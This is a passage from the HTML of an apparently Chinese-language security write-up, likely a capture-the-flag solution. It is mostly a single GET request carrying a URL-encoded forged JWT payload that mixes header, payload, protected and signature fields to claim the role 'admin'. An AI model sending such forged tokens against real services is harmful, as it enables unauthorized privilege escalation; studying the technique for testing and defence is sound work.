/>\neyJleHAiOjE3MDM1OTg3NjMsImlhdCI6MTcwMzU5NTE2MywianRpIjoiM29tenpJNG9HZkdkUjgyVGp3YnNhUSIsIm5iZiI6MTcwMzU5NTE2Mywicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9</p>\n</blockquote>\n<p>发送请求：</p>\n<figure class=\"highlight scss\"><figcaption data-lang=\"Sass (Scss)\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>GET /?token=<span class=\"token placeholder selector\">%7b</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%68</span><span class=\"token placeholder selector\">%62</span><span class=\"token placeholder selector\">%47</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%51</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%7a</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%31</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%73</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%52</span><span class=\"token placeholder selector\">%35</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%43</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%6b</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%58</span><span class=\"token placeholder selector\">%56</span><span class=\"token placeholder selector\">%43</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%2e</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%6c</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%48</span><span class=\"token placeholder selector\">%41</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%6a</span><span class=\"token placeholder selector\">%45</span><span class=\"token placeholder selector\">%33</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%44</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%31</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%54</span><span class=\"token placeholder selector\">%67</span><span class=\"token placeholder selector\">%33</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%6a</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%73</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%6c</span><span class=\"token placeholder selector\">%68</span><span class=\"token placeholder selector\">%64</span><span class=\"token placeholder selector\">%43</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%54</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%7a</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%35</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%54</span><span class=\"token placeholder selector\">%45</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%61</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%52</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%6a</span><span class=\"token placeholder selector\">%6f</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%74</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%47</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%48</span><span class=\"token placeholder selector\">%5a</span><span class=\"token placeholder selector\">%6b</span><span class=\"token placeholder selector\">%64</span><span class=\"token placeholder selector\">%6b</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%6a</span><span class=\"token placeholder selector\">%67</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%56</span><span class=\"token placeholder selector\">%47</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%33</span><span class=\"token placeholder selector\">%59</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%68</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%53</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%73</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%35</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%5a</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%54</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%7a</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%35</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%54</span><span class=\"token placeholder selector\">%45</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%73</span><span class=\"token placeholder selector\">%5a</span><span class=\"token placeholder selector\">%53</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%46</span><span class=\"token placeholder selector\">%6b</span><span class=\"token placeholder selector\">%62</span><span class=\"token placeholder selector\">%57</span><span class=\"token placeholder selector\">%6c</span><span class=\"token placeholder selector\">%75</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%64</span><span class=\"token placeholder selector\">%58</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%6c</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%35</span><span class=\"token placeholder selector\">%68</span><span class=\"token placeholder selector\">%62</span><span class=\"token placeholder selector\">%57</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%62</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%61</span><span class=\"token placeholder selector\">%58</span><span class=\"token placeholder selector\">%42</span><span class=\"token placeholder selector\">%76</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%43</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%2e</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%3a</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%2c</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%72</span><span class=\"token placeholder selector\">%6f</span><span class=\"token placeholder selector\">%74</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%74</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%64</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%3a</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%68</span><span class=\"token placeholder selector\">%62</span><span class=\"token placeholder selector\">%47</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%51</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%7a</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%31</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%73</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%52</span><span class=\"token placeholder selector\">%35</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%43</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%6b</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%58</span><span class=\"token placeholder selector\">%56</span><span class=\"token placeholder selector\">%43</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%2c</span><span class=\"token placeholder selector\">%20</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%61</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%6c</span><span class=\"token placeholder selector\">%6f</span><span class=\"token placeholder selector\">%61</span><span class=\"token placeholder selector\">%64</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%3a</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%6c</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%48</span><span class=\"token placeholder selector\">%41</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%6a</span><span class=\"token placeholder selector\">%45</span><span class=\"token placeholder selector\">%33</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%44</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%31</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%54</span><span class=\"token placeholder selector\">%67</span><span class=\"token placeholder selector\">%33</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%6a</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%73</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%6c</span><span class=\"token placeholder selector\">%68</span><span class=\"token placeholder selector\">%64</span><span class=\"token placeholder selector\">%43</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%54</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%7a</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%35</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%54</span><span class=\"token placeholder selector\">%45</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%61</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%52</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%6a</span><span class=\"token placeholder selector\">%6f</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%74</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%47</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%48</span><span class=\"token placeholder selector\">%5a</span><span class=\"token placeholder selector\">%6b</span><span class=\"token placeholder selector\">%64</span><span class=\"token placeholder selector\">%6b</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%6a</span><span class=\"token placeholder selector\">%67</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%56</span><span class=\"token placeholder selector\">%47</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%33</span><span class=\"token placeholder selector\">%59</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%68</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%53</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%73</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%35</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%5a</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%54</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%7a</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%35</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%54</span><span class=\"token placeholder selector\">%45</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%73</span><span class=\"token placeholder selector\">%5a</span><span class=\"token placeholder selector\">%53</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%64</span><span class=\"token placeholder selector\">%31</span><span class=\"token placeholder selector\">%5a</span><span class=\"token placeholder selector\">%58</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%30</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%64</span><span class=\"token placeholder selector\">%58</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%6c</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%35</span><span class=\"token placeholder selector\">%68</span><span class=\"token placeholder selector\">%62</span><span class=\"token placeholder selector\">%57</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%62</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%61</span><span class=\"token placeholder selector\">%58</span><span class=\"token placeholder selector\">%42</span><span class=\"token placeholder selector\">%76</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%43</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%2c</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%73</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%67</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%61</span><span class=\"token placeholder selector\">%74</span><span class=\"token placeholder selector\">%75</span><span class=\"token placeholder selector\">%72</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%3a</span><span class=\"token placeholder selector\">%22</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%61</span><span class=\"token placeholder selector\">%74</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%75</span><span class=\"token placeholder selector\">%56</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%61</span><span class=\"token placeholder selector\">%33</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%75</span><span class=\"token placeholder selector\">%34</span><span class=\"token placeholder selector\">%53</span><span class=\"token placeholder selector\">%31</span><span class=\"token placeholder selector\">%6f</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%64</span><span class=\"token placeholder selector\">%73</span><span class=\"token placeholder selector\">%34</span><span class=\"token placeholder selector\">%61</span><span class=\"token placeholder selector\">%45</span><span class=\"token placeholder selector\">%5a</span><span class=\"token placeholder selector\">%31</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%33</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%75</span><span class=\"token placeholder selector\">%72</span><span class=\"token placeholder selector\">%37</span><span class=\"token placeholder selector\">%75</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%6f</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%44</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%58</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%72</span><span class=\"token placeholder selector\">%73</span><span class=\"token placeholder selector\">%53</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%41</span><span class=\"token placeholder selector\">%61</span><span class=\"token placeholder selector\">%78</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%44</span><span class=\"token placeholder selector\">%44</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%6b</span><span class=\"token placeholder selector\">%54</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%30</span><span class=\"token placeholder selector\">%56</span><span class=\"token placeholder selector\">%44</span><span class=\"token placeholder selector\">%41</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%4c</span><span class=\"token placeholder selector\">%50</span><span class=\"token placeholder selector\">%78</span><span class=\"token placeholder selector\">%35</span><span class=\"token placeholder selector\">%47</span><span class=\"token placeholder selector\">%67</span><span class=\"token placeholder selector\">%38</span><span class=\"token placeholder selector\">%5a</span><span class=\"token placeholder selector\">%5f</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%48</span><span class=\"token placeholder selector\">%42</span><span class=\"token placeholder selector\">%4b</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%46</span><span class=\"token placeholder selector\">%2d</span><span class=\"token placeholder selector\">%41</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%59</span><span class=\"token placeholder selector\">%30</span><span class=\"token placeholder selector\">%4b</span><span class=\"token placeholder selector\">%6f</span><span class=\"token placeholder selector\">%59</span><span class=\"token placeholder selector\">%6f</span><span class=\"token placeholder selector\">%58</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%50</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%6a</span><span class=\"token placeholder selector\">%78</span><span class=\"token placeholder selector\">%50</span><span class=\"token placeholder selector\">%64</span><span class=\"token placeholder selector\">%45</span><span class=\"token placeholder selector\">%5f</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%5a</span><span class=\"token placeholder selector\">%35</span><span class=\"token placeholder selector\">%54</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%5f</span><span class=\"token placeholder selector\">%54</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%66</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%34</span><span class=\"token placeholder selector\">%44</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%42</span><span class=\"token placeholder selector\">%72</span><span class=\"token placeholder selector\">%6b</span><span class=\"token placeholder selector\">%45</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%4b</span><span class=\"token placeholder selector\">%50</span><span class=\"token placeholder selector\">%50</span><span class=\"token placeholder selector\">%47</span><span class=\"token placeholder selector\">%48</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%2d</span><span class=\"token placeholder selector\">%33</span><span class=\"token placeholder selector\">%53</span><span class=\"token placeholder selector\">%48</span><span class=\"token placeholder selector\">%46</span><span class=\"token placeholder selector\">%76</span><span class=\"token placeholder selector\">%75</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%6a</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%6f</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%45</span><span class=\"token placeholder selector\">%42</span><span class=\"token placeholder selector\">%72</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%6b</span><span class=\"token placeholder selector\">%53</span><span class=\"token placeholder selector\">%6a</span><span class=\"token placeholder selector\">%42</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%75</span><span class=\"token placeholder selector\">%43</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%31</span><span class=\"token placeholder selector\">%41</span><span class=\"token placeholder selector\">%52</span><span class=\"token placeholder selector\">%2d</span><span class=\"token placeholder selector\">%6c</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%6d</span><span class=\"token placeholder selector\">%4b</span><span class=\"token placeholder selector\">%58</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%47</span><span class=\"token placeholder selector\">%5f</span><span class=\"token placeholder selector\">%4a</span><span class=\"token placeholder selector\">%75</span><span class=\"token placeholder selector\">%51</span><span class=\"token placeholder selector\">%73</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%62</span><span class=\"token placeholder selector\">%41</span><span class=\"token placeholder selector\">%66</span><span class=\"token placeholder selector\">%59</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%48</span><span class=\"token placeholder selector\">%56</span><span class=\"token placeholder selector\">%5f</span><span class=\"token placeholder selector\">%4c</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%68</span><span class=\"token placeholder selector\">%72</span><span class=\"token placeholder selector\">%6c</span><span class=\"token placeholder selector\">%72</span><span class=\"token placeholder selector\">%38</span><span class=\"token placeholder selector\">%58</span><span class=\"token placeholder selector\">%56</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%4c</span><span class=\"token placeholder selector\">%43</span><span class=\"token placeholder selector\">%62</span><span class=\"token placeholder selector\">%62</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%68</span><span class=\"token placeholder selector\">%66</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%48</span><span class=\"token placeholder selector\">%48</span><span class=\"token placeholder selector\">%47</span><span class=\"token placeholder selector\">%67</span><span class=\"token placeholder selector\">%35</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%49</span><span class=\"token placeholder selector\">%57</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%33</span><span class=\"token placeholder selector\">%4e</span><span class=\"token placeholder selector\">%5f</span><span class=\"token placeholder selector\">%43</span><span class=\"token placeholder selector\">%51</span><span class=\"token placeholder selector\">%74</span><span class=\"token placeholder selector\">%72</span><span class=\"token placeholder selector\">%63</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%41</span><span class=\"token placeholder selector\">%6a</span><span class=\"token placeholder selector\">%51</span><span class=\"token placeholder selector\">%30</span><span class=\"token placeholder selector\">%67</span><span class=\"token placeholder selector\">%65</span><span class=\"token placeholder selector\">%71</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%74</span><span class=\"token placeholder selector\">%38</span><span class=\"token placeholder selector\">%6a</span><span class=\"token placeholder selector\">%59</span><span class=\"token placeholder selector\">%66</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%38</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%57</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%76</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%62</span><span class=\"token placeholder selector\">%50</span><span class=\"token placeholder selector\">%6f</span><span class=\"token placeholder selector\">%72</span><span class=\"token placeholder selector\">%50</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%78</span><span class=\"token placeholder selector\">%47</span><span class=\"token placeholder selector\">%51</span><span class=\"token placeholder selector\">%7a</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%64</span><span class=\"token placeholder selector\">%55</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%2d</span><span class=\"token placeholder selector\">%44</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%51</span><span class=\"token placeholder selector\">%4c</span><span class=\"token placeholder selector\">%52</span><span class=\"token placeholder selector\">%4c</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%44</span><span class=\"token placeholder selector\">%44</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%68</span><span class=\"token placeholder selector\">%34</span><span class=\"token placeholder selector\">%47</span><span class=\"token placeholder selector\">%66</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%50</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%6f</span><span class=\"token placeholder selector\">%59</span><span class=\"token placeholder selector\">%52</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%51</span><span class=\"token placeholder selector\">%77</span><span class=\"token placeholder selector\">%48</span><span class=\"token placeholder selector\">%35</span><span class=\"token placeholder selector\">%76</span><span class=\"token placeholder selector\">%62</span><span class=\"token placeholder selector\">%53</span><span class=\"token placeholder selector\">%37</span><span class=\"token placeholder selector\">%30</span><span class=\"token placeholder selector\">%5f</span><span class=\"token placeholder selector\">%4f</span><span class=\"token placeholder selector\">%44</span><span class=\"token placeholder selector\">%4d</span><span class=\"token placeholder selector\">%6c</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%6e</span><span class=\"token placeholder selector\">%51</span><span class=\"token placeholder selector\">%56</span><span class=\"token placeholder selector\">%39</span><span class=\"token placeholder selector\">%68</span><span class=\"token placeholder selector\">%57</span><span class=\"token placeholder selector\">%59</span><span class=\"token placeholder selector\">%79</span><span class=\"token placeholder selector\">%33</span><span class=\"token placeholder selector\">%4b</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%50</span><span class=\"token placeholder selector\">%2d</span><span class=\"token placeholder selector\">%4b</span><span class=\"token placeholder selector\">%6b</span><span class=\"token placeholder selector\">%6a</span><span class=\"token placeholder selector\">%53</span><span class=\"token placeholder selector\">%32</span><span class=\"token placeholder selector\">%36</span><span class=\"token placeholder selector\">%4c</span><span class=\"token placeholder selector\">%58</span><span class=\"token placeholder selector\">%62</span><span class=\"token placeholder selector\">%70</span><span class=\"token placeholder selector\">%30</span><span class=\"token placeholder selector\">%74</span><span class=\"token placeholder selector\">%69</span><span class=\"token placeholder selector\">%71</span><span class=\"token placeholder selector\">%4c</span><span class=\"token placeholder selector\">%50</span><span class=\"token placeholder selector\">%37</span><span class=\"token placeholder selector\">%72</span><span class=\"token placeholder 